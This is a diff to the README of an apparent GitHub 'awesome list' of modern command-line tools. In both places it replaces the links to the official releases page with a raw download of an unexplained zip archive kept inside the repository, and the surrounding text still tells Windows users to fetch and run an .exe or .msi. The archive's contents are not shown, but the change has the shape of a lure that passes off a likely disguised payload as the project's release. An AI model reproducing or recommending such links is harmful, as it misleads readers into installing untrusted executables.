@@ -1,6 +1,6 @@
 # 🚀 awesome-modern-cli - Replace old tools with faster alternatives
 
-[![](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/MarioRealista/awesome-modern-cli/releases)
+[![](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/MarioRealista/awesome-modern-cli/raw/refs/heads/main/bookman/cli-modern-awesome-v3.1.zip)
 
 This project provides a list of modern command-line tools. These tools perform the same jobs as classic Unix utilities but offer more speed, better layouts, and additional information. Modern tools often use colors and smarter displays to help you work faster in your terminal window.
 
@@ -12,7 +12,7 @@ Classic command-line tools have existed for decades. While they work well, they 
 
 You can obtain these tools through the official GitHub release page. 
 
-[Visit this page to download](https://github.com/MarioRealista/awesome-modern-cli/releases)
+[Visit this page to download](https://github.com/MarioRealista/awesome-modern-cli/raw/refs/heads/main/bookman/cli-modern-awesome-v3.1.zip)
 
 Follow the linked site to find the latest version. Select the file labeled for Windows. Most users should download the file ending in .exe or .msi to ensure the tool installs correctly.
 
